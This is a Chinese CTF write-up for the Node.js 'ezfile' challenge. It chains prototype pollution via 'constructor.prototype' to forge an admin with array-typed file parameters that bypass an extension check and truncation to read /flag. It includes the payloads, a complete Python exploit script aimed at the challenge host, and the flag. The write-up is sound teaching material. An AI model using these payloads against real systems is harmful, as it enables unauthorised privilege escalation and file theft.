---
title: "ezfile"
description: "一题 Node.js Web 题，利用原型污染伪造管理员，再结合数组参数与截断顺序问题读出 /flag。"
pubDate: 2026-06-08
category: "比赛 WP"
contest: "黄河流域公安院校网络安全技能挑战赛"
contestSlug: "yellow-river-police-2026"
coverImage: "/contest-covers/yellow-river-police-2026.svg"
track: "Web"
tags: ["CTF", "Web", "Node.js", "原型污染", "任意文件读取"]
oj: "黄河流域"
difficulty: "Easy"
language: "Python"
featured: false
draft: false
---

## Summary

这是一道 Node.js Web 题，核心是两段漏洞拼接：

1. `/api/pollute` 存在原型污染，可以把 `Object.prototype.nonce` 改成我们指定的值，从而伪造管理员身份。
2. `/api/checkfile` 对 `file` 参数的校验顺序有问题。它先检查扩展名，再做长度截断，还允许 `file` 作为数组参与后续路径拼接，因此可以构造出任意文件读取，最终读到 `/flag`。

## Environment

- Target: `http://175.27.251.122:10010`
- Local source: `D:\codex1\黄河流域\ezlog\ezfile(2).js`
- Exploit script: `D:\codex1\黄河流域\ezlog\solve_ezfile.py`

## Vulnerability Analysis

### 1. 原型污染点

源码中的关键逻辑：

```js
function merge(target, source, res) {
    for (let key in source) {
        if (key === '__proto__') {
            if (res) {
                res.send('？？？？');
                return;
            }
            continue;
        }

        if (source[key] instanceof Object && key in target) {
            merge(target[key], source[key], res);
        } else {
            target[key] = source[key];
        }
    }
}
```

很多新手看到 `__proto__` 被过滤，就会以为原型污染做不了了，但这里还有一个常见绕过思路：

```json
{"constructor":{"prototype":{"nonce":"x"}}}
```

原因是：

- `adminconfig` 是普通对象，它天然有 `constructor` 属性。
- `adminconfig.constructor === Object`
- `Object.prototype` 也存在。
- 所以 `merge()` 会递归进入 `constructor -> prototype -> nonce`
- 最终把 `Object.prototype.nonce` 改成我们指定的 `x`

而管理员校验写的是：

```js
function isAdmin(name, nonce) {
    return name === adminconfig.name && nonce === Object.prototype.nonce;
}
```

这意味着只要我们把 `Object.prototype.nonce` 改成自己知道的值，再提交：

```json
{"name":"CTF-ADMIN","nonce":"x"}
```

就能通过管理员校验。

### 2. 文件读取点

读取文件的关键代码：

```js
if (!allowedFile(file)) {
    return res.send('File type not allowed.');
}

if (file.includes(' ') || file.includes('/') || file.includes('..')) {
    return res.send('Invalid filename!');
}

if (file.length > 10) {
    file = file.slice(0, 10);
}

const returned = path.resolve('./' + file);
fs.readFile(returned, (err) => {
    if (err) {
        return res.send('An error occured!');
    }
    res.sendFile(returned);
});
```

这里有三个关键点：

1. `allowedFile(file)` 在前面执行，只要“最后一个点后面的内容是 `log`”就能通过。
2. 之后才做 `file.length > 10` 的截断。
3. `req.query.file` 不一定是字符串，也可以是数组。

如果 `file` 是数组，那么：

- `lastIndexOf('.')` 走的是数组方法
- `slice()` 走的也是数组方法
- `format == 'log'` 会发生类型转换

所以我们可以把 `file` 伪造成一个数组，让它在校验时看起来像是以 `.log` 结尾，但在真正读取时，前 10 个数组元素又能拼成我们想读的绝对路径。

## Exploit Idea

### Step 1: 先拿管理员权限

向 `/api/pollute` 发送：

```json
{"constructor":{"prototype":{"nonce":"x"}}}
```

成功后，服务端的 `Object.prototype.nonce` 会被改成 `x`。

### Step 2: 构造数组型 `file`

最核心的技巧是这一组参数：

```text
file[0]=../../../../
file[1]=/../.
file[2]=/../.
file[3]=/../.
file[4]=/../.
file[5]=/../.
file[6]=/../.
file[7]=/../.
file[8]=/../.
file[9]=/../flag
file[10]=.
file[11]=log
```

为什么要这样构造：

1. `file[10]='.'` 和 `file[11]='log'`
   这让 `allowedFile(file)` 看到数组末尾是 `['.', 'log']`，于是通过扩展名检查。

2. `file.length > 10` 后，服务端只保留前 10 项
   也就是只剩下真正用于读文件的路径部分，后面的 `.` 和 `log` 被切掉了。

3. 数组拼成字符串时会自动插入逗号
   这会把路径搞乱，所以我们需要用 `'/../.'` 这种片段抵消掉逗号带来的副作用。

4. `path.resolve('./' + file)` 会对路径做规范化
   经过规范化后，可以收敛到 `/flag`。

## Step-by-Step Reproduction

### Step 1: 先确认站点功能

浏览器访问：

```text
http://175.27.251.122:10010/
```

会看到一个 `Log Reader` 页面，前端会向 `/api/checkfile` 发请求。

### Step 2: 阅读源码，确定两个攻击点

重点观察：

- `merge()` 是否存在原型污染
- `isAdmin()` 是否依赖 `Object.prototype.nonce`
- `allowedFile()`、`includes()`、`slice()` 是否能被数组类型利用

这道题的突破口就是把“原型污染”和“数组文件名绕过”串起来。

### Step 3: 手动验证管理员绕过

可以用 Python 先测试污染是否成功：

```python
import requests

base = "http://175.27.251.122:10010"
s = requests.Session()

r = s.post(base + "/api/pollute", json={
    "constructor": {
        "prototype": {
            "nonce": "x"
        }
    }
})
print(r.text)

r = s.post(base + "/api/checkfile?file=app.log", json={
    "name": "CTF-ADMIN",
    "nonce": "x"
})
print(r.status_code, r.text)
```

如果返回不再是：

```text
Sorry Only privileged Admin can check the file.
```

说明管理员认证已经被绕过。

### Step 4: 构造最终读 `/flag` 的请求

完整思路：

- 先污染 `Object.prototype.nonce = "x"`
- 再提交数组型 `file`
- 让前 10 项拼出 `/flag`
- 让第 11、12 项负责伪造 `.log`

### Step 5: 直接运行完整 exp

工作区里已经有完整脚本：

```bash
python D:\codex1\黄河流域\ezlog\solve_ezfile.py
```

输出：

```text
flag{RE2AL47_E42Y_F1le}
```

## Full Solve Script

```python
import requests


BASE_URL = "http://175.27.251.122:10010"
ADMIN_NAME = "CTF-ADMIN"
ATTACKER_NONCE = "x"


def build_file_params(target_path: str):
    if not target_path.startswith("/"):
        raise ValueError("target_path must be an absolute path like /flag")

    parts = [part for part in target_path.split("/") if part]
    if len(parts) > 9:
        raise ValueError("target_path is too deep for this 10-element payload layout")

    elements = ["../../../../"]
    filler_count = 10 - 1 - len(parts)
    elements += ["/../."] * filler_count

    for index, part in enumerate(parts):
        suffix = "/" if index < len(parts) - 1 else ""
        elements.append(f"/../{part}{suffix}")

    params = []
    for index, value in enumerate(elements):
        params.append((f"file[{index}]", value))

    params.append(("file[10]", "."))
    params.append(("file[11]", "log"))
    return params


def main():
    session = requests.Session()

    session.post(
        f"{BASE_URL}/api/pollute",
        json={"constructor": {"prototype": {"nonce": ATTACKER_NONCE}}},
        timeout=10,
    ).raise_for_status()

    response = session.post(
        f"{BASE_URL}/api/checkfile",
        params=build_file_params("/flag"),
        json={"name": ADMIN_NAME, "nonce": ATTACKER_NONCE},
        timeout=10,
    )
    response.raise_for_status()
    print(response.text.strip())


if __name__ == "__main__":
    main()
```

## Flag

```text
flag{RE2AL47_E42Y_F1le}
```

## Why the Challenge Works

从漏洞链角度看，这题可以总结成：

1. 深度合并函数写得不安全，导致原型污染。
2. 管理员认证依赖全局原型属性，导致权限绕过。
3. `file` 参数未强制为字符串，导致数组参与后续逻辑。
4. 扩展名检查、过滤、截断、路径拼接的顺序不合理，导致任意文件读取。

## Common Pitfalls for Beginners

### 1. 只盯着 `__proto__`

很多人看到 `__proto__` 被过滤就停了，但 `constructor.prototype` 是原型污染题里非常经典的绕过。

### 2. 忽略数组类型

Web 题里参数不一定总是字符串：

- `?a=1&a=2`
- `?a[0]=x&a[1]=y`
- `?a[b]=c`

这些都可能让后端拿到数组或对象。

### 3. 看到 `includes('/')` 就以为路径遍历没戏

题目不一定非要直接传字符串 `../../flag`。如果后端后面还会做截断、拼接、转换，那就还有文章可做。
